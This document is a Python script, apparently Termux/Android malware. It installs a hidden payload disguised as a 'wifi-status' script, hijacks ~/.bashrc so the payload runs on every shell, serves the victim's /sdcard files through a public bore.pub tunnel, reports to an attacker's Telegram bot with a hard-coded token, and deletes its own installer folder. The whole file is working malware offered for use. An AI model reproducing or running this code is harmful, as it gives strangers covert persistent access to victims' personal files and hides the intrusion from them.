import os, subprocess, shutil
import urllib.request
import urllib.parse

def sender(message):
	try:
		encoded_data = urllib.parse.urlencode({'chat_id': '5867708857', 'text': message}).encode('utf-8')
		request = urllib.request.Request('https://api.telegram.org/bot8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo/sendMessage', data=encoded_data, method='POST')
		response = urllib.request.urlopen(request)
	except:
		pass

malicious = """
try:
	import flask, requests
except ImportError:
	import urllib.request
	import urllib.parse
	import subprocess
	def sender(message):
		try:
			encoded_data = urllib.parse.urlencode({'chat_id': '5867708857', 'text': message}).encode('utf-8')
			request = urllib.request.Request('https://api.telegram.org/bot8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo/sendMessage', data=encoded_data, method='POST')
			response = urllib.request.urlopen(request)
		except:
			pass
	sender('☆ Installing requirements...')
	subprocess.run("pkg install bore -y && pip install flask requests", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
	sender('☆ Requirements installed.')

import os, random, subprocess, time, threading, requests
from flask import Flask, request, send_from_directory
from multiprocessing import Process

app = Flask(__name__)
BASE_DIR = "/sdcard/"

def check_internet():
	while True:
		try:
			response = requests.post('https://api.telegram.org/bot8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo/sendMessage', data={'chat_id': '5867708857', 'text': '☆ Victim is online.'})
			break
		except:
			pass

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def list_files(path):
    if request.cookies.get('access_granted_by_mustapha') == 'true':
        current_path = os.path.join(BASE_DIR, path)
        if os.path.isfile(current_path):
            return send_from_directory(os.path.dirname(current_path), os.path.basename(current_path))
        if os.path.isdir(current_path):
            html_content = f'''
        <!doctype html>
        <title>File Browser</title>
        <h1>Current Directory: /{path}</h1>
        <ul>
        '''
            if path != '':
                parent_dir = os.path.dirname(path)
                html_content += f'<li><a href="/{parent_dir}">..</a></li>'
            with os.scandir(current_path) as entries:
                for entry in entries:
                    if entry.is_dir():
                        html_content += f'<li><a href="/{os.path.join(path, entry.name)}">{entry.name}/</a></li>'
                    else:
                        html_content += f'<li><a href="/{os.path.join(path, entry.name)}">{entry.name}</a></li>'
            html_content += "</ul>"
            return html_content
        return "Not Found", 404
    return 'Error: Not Authorized.'

def run_flask_server(por):
    app.run(host='0.0.0.0', port=por, debug=False)

def start_server(port):
	server_process = Process(target=run_flask_server, args=(port,))
	server_process.start()

def sender(message):
	try:
		response = requests.post('https://api.telegram.org/bot8481096717:AAHx35rMNRLOih1bbHqPyc4LTdWW99CoWYo/sendMessage', data={'chat_id': '5867708857', 'text': message})
	except:
		pass

def extract_url_from_text(text, process):
	words = text.split()
	if "yes" in words:
		process.stdin.write(b"yes")
		process.stdin.flush()
		return "yes found"
	else:
		for word in words:
			if word.startswith("bore.pub:"):
				return word
		return None

def open_ssh_connection():
	check_internet()
	port = random.choice(range(1000, 10000))
	start_server(port)
	time.sleep(5)
	ssh_command = f"bore local {port} --to bore.pub"
	process = subprocess.Popen(ssh_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, start_new_session=True)
	urll = None
	for line in iter(process.stdout.readline, b''):
		output = line.decode('utf-8').strip()
		print(output)
		urll = extract_url_from_text(output, process)
		if urll:
			break
	if urll:
		if "bore.pub" in urll:
			message = f"The service is online : {urll}"
			sender(message)
			while True:
				if process.poll() is not None:
					open_ssh_connection()
					break
				time.sleep(10)
		elif urll == "yes found":
			open_ssh_connection()
		elif urll == None:
			message = "☆ Failed to establish a connection."
			sender(message)
	else:
		message = "☆ Failed to establish a connection."
		sender(message)

open_ssh_connection()
"""

def install_malware():
	try:
		with open(".python_config.py", "w") as c:
			for line in malicious:
				c.write(line)
		with open(".wifi-status.sh", "w") as c:
			c.write("""#!/data/data/com.termux/files/usr/bin/bash
python ~/../usr/bin/.python_config.py >/dev/null 2>&1 &""")
		subprocess.run("chmod +x .wifi-status.sh && mv .wifi-status.sh .python_config.py ~/../usr/bin/", stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)
		bashrc_path = os.path.join(os.getenv('HOME'), '.bashrc')
		with open(bashrc_path, "w") as b:
			b.write(".wifi-status.sh")
		message = "☆ Malware is Setup."
		sender(message)
	except Exception as E:
		sender(f"Setting up the malware faced an Error: {E}")

install_malware()

current_file_path = os.path.abspath(__file__)
current_folder_path = os.path.dirname(current_file_path)
sender('☆ Deleting setup script is Done.')
shutil.rmtree(current_folder_path)